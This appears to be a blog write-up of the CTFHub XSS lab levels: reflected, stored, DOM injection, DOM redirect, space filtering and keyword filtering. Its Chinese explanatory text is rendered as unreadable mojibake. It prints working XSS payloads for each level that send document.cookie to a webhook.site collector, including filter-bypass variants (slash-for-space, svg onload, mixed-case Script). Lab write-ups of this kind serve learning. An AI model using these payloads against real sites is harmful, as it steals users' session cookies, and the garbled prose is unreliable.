+++
date = '2026-05-27T12:50:14+08:00'
draft = false
title = 'Xss Ctfhub'
+++

# ctfhub鎶€鑳芥爲xss闈跺満

杩欎釜闈跺満闇€瑕佷娇鐢▁ss骞冲彴鏉ヨ幏鍙朾ot璁块棶鎼哄甫鐨刢ookie绛変俊鎭紝闇€鐢ㄥ€熺敤鍒扮涓夋柟骞冲彴鎴戜娇鐢ㄧ殑鏄痆Webhook.site - Test, transform and automate Web requests and emails](https://webhook.site/#!/view/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/12e433b3-a4ea-4532-a3ed-caa7f5586fcd/1)

鍓嶇疆娣卞寲鐭ヨ瘑锛寀rl璇锋眰鎷兼帴鏌ヨ

fetch璇锋眰锛氳鎯崇敤fetch璇锋眰寮曞js璁块棶锛屽繀椤绘妸fetch鏀惧湪<script>鏍囩涔嬮棿鎴栬€呮槸鍦ㄦ爣绛惧唴閮ㄩ€氳繃涓€浜涗簨浠跺睘鎬ф潵璁块棶杩欎釜fetch缃戝潃

```
<script>
  fetch('http://xxxxxxx/?c=' + document.cookie);
</script>
```

```
<img src="x" onerror="fetch('http://xxxxxxx/?c=' + document.cookie)">
```

杩樻湁灏辨槸鍐欒繘payload鐨? /绛夌鍙凤紝濡傛灉涓嶉€傜敤url缂栫爜鍙兘浼氳褰撲綔绌烘牸澶勭悊

## 鍙嶅皠鍨媥ss

绗竴鍏充笂鏉ワ紝鍙互鐪嬪埌鏁翠釜闈跺満鐨勬€濊矾锛屽厛鏄竴涓猻ubmit锛岀敤鏉ラ獙璇亁ss婕忔礊鏉ョ殑锛岀劧鍚庡氨鏄笅闈㈢殑send to bot 杩欎釜鐢ㄦ潵妯℃嫙鐪熷疄鐢ㄦ埛璁块棶鎴戜滑鐨剎ss娉ㄥ叆鑴氭湰鏉ヨ幏鍙栧埌flag鐨勮繃绋嬶紝

鍏堥獙璇?*<script>alert(1)</script>script>**杩欎釜payload鏉ョ‘璁ss婕忔礊鐨勫瓨鍦?
鍦ㄧ涓€鍏抽噷闈㈡垜浠娇鐢ㄨ繖涓猵ayload锛?img src=x onerror="fetch('https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/?c=' + document.cookie)">

![image-20260526195003698](image-20260526195003698.png)

鏈嶅姟鍣ㄧ洿鎺?02锛屼唬鐮佷腑鐨?`+` 鍙枫€乣'` 鍗曞紩鍙峰湪鏈粡濡ュ杽 URL 缂栫爜鐨勬儏鍐典笅鍙戦€佺粰鏈嶅姟鍣紝鏋佹槗瀵艰嚧鍚庣瑙ｆ瀽 URL 鍙傛暟鏃跺彂鐢熼敊浣嶏紝鐢氳嚦寮曞彂鏈嶅姟鍣ㄨ剼鏈姤閿欍€?
鍙互閫氳繃鍙嶅紩鍙峰幓鎺?  payload锛?
```
<img src=x onerror="fetch(`https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/?c=${document.cookie}`)">
```

![image-20260526200347961](image-20260526200347961.png)

灏卞彲浠ュ幓鎵庡埌flag

## 瀛樺偍鍨媥ss

杩欎竴鍏冲緢蹇氨鑳藉彂鐜板鎬殑鍦版柟锛岃緭鍏ヤ簡payload杩涘幓鍙戠幇url骞舵病鏈夊彉鍖栧彂鐜拌繖涓€鍏虫槸涓€涓猵ost璇锋眰鎻愪氦鐨勶紝杩欑瀛樺偍鍨嬬殑xss锛屽湪鎴戜滑鎻愪氦浜唒ost璇锋眰涔嬪悗锛岃繖涓暟鎹氨宸茬粡琚啓鍏ュ埌浜嗘暟鎹簱锛屽悗闈㈡瘡涓闂繖涓綉鍧€鐨勪汉閮戒細琚玿ss娉ㄥ叆

鍙渶瑕佸埛鏂伴〉闈㈡彁浜ゅ綋鍓嶇殑url锛宐ot璁块棶杩欎釜椤甸潰灏变細鎷垮埌bot鐨刢ookie

## DOM鍙嶅皠

DOM鍨嬬殑xss婕忔礊璇寸櫧浜嗗氨鏄墠绔痡s閫昏緫杩囨护锛屽墠绔病鏈墂af骞插噣鎴戜滑鐨勮緭鍏ワ紝杩欎釜鏄彂鐢熷湪鍓嶇鐨勶紝涓嶆兂鍙嶅皠鍨嬪拰瀛樺偍鍨嬪彂閫佸埌浜嗗悗绔湇鍔″櫒

![image-20260526204109152](image-20260526204109152.png)

鎵惧埌杈撳叆鐨勫湴鏂硅闂悎,鍦ㄨ緭鍏ュ唴瀹规渶鍓嶆柟瑕侀棴鍚堝崟寮曞彿锛岀劧鍚庯紱鍒嗗彿缁撴潫璇彞锛屾渶鍚庡湪鏈熬//鏉ユ敞閲婃帀鏈熬鐨勭鍙?
鎵€浠ヨ繖閲屽彲浠ラ€氳繃fetch鐨勬柟寮忓紩瀵艰闂綉椤?
涔熷彲浠ラ€氳繃new Image().src鐨勬柟寮忓幓璁块棶

```
'; new Image().src = 'https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/?c=' + document.cookie; //
```

## DOM璺宠浆

杩欎竴鍏宠繘鏉ュ彂鐜皊ubmit灏辨病浜?

![image-20260526214259859](image-20260526214259859.png)

```
var target = location.search.split("=")
if (target[0].slice(1) == "jumpto") {
    location.href = target[1]; // <--- 婕忔礊鏍稿績锛歋ink锛堣緭鍑虹偣锛?}##杩欎釜鏄垰鎵嶉偅涓墠绔簮鐮佸叧閿偣
```

**`location.search`**锛氳繖鏄?JavaScript 鐨勫唴缃睘鎬э紝鐢ㄦ潵鑾峰彇 URL 涓棶鍙?`?` 鍙婂叾鍚庨潰鐨勬墍鏈夊唴瀹广€?
**`.split("=")`**锛氳繖鏄竴涓瓧绗︿覆鍒嗗壊鍑芥暟锛屾剰鎬濇槸鈥滅湅鍒扮瓑鍙?`=`锛屽氨鎶婂瓧绗︿覆鍒囧紑锛屽彉鎴愪竴涓暟缁勨€濄€?
娉ㄥ叆鐐瑰氨鏄繖涓弬鏁帮紝杈撳叆?jumpto=javascript:alert(1)鍙戠幇浜嗗彲寮圭獥锛岃繖閲屾槸涓€涓敞鍏ョ偣锛屾湁寮圭獥灏卞彲浠ュ幓鎿嶄綔浜?
```
?jumpto=javascript:fetch('https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/' + document.cookie)
```

## 杩囨护绌烘牸

杩欎竴鍏崇嫚鏄庢樉杩囨护鎺変簡绌烘牸锛屼絾鏄繖涓猵ayload锛歚<Script>fetch('https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/?c='+document.cookie)<Script>`涔熶細瑙﹀彂waf锛岃繖鏄洜涓哄湪get璇锋眰鐨剈rl瑙ｆ瀽涓紝+鍙蜂細琚緢澶氭湇鍔″櫒鑷姩瑙ｆ瀽涓虹┖鏍?
鍙互鎯冲埌杩欎釜浣跨敤/浠ｆ浛绌烘牸鐨勮繖涓猵ayload

```
<img/src=1/onerror=location.href=`https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/?c=${document.cookie}`>
```

浣嗘槸杩欎釜/src=1/杩欎釜浼氳瑙ｆ瀽鎴愬浘鐗囪矾寰勶紝杩斿洖涓€涓姤閿?04锛岀敤url缂栫爜鏇夸唬/鏄竴涓€濊矾锛屼絾鏄湪杩?0a鍦ㄨ繖琚綋鎴愬瓧绗︿覆鍘熸牱杈撳嚭

![image-20260526234437155](image-20260526234437155.png)

鍙傝€冪殑csdn涓婄殑鏂囩珷浣跨敤杩欑payload杩囧叧

```
<img/src=//webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f?c=123>
```

浣嗘槸杩欑鏌ュ埌鐨勫弬鏁癱=123,鎴戞崲鎴恉ocument.cookie灏辩洿鎺ョ粰鎴戣繑鍥炲師瀛楃锛?
鎴戝氨涓嶇煡閬撲负浠€涔堜簡锛岃codex璺戦鍑烘潵鐨刾ayload鏄繖涓?
```
<svg/onload=fetch('https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f?c='+encodeURIComponent(document.cookie))>
```



## 杩囨护鍏抽敭璇?
鐩存帴璇曢敊锛岃繃婊ゆ帀浜唖cript锛岄偅杩欎釜灏变笉闅句簡锛岀洿鎺ヨ瘯璇曞ぇ灏忓啓缁曡繃

![image-20260526232230871](image-20260526232230871.png)

鐩存帴灏辩粫杩囦簡锛?
payload`<Script>fetch('https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/?c='+document.cookie)`

鐒跺悗鎷垮埌鐨剈rl鍙戠粰bot灏眔k浜?
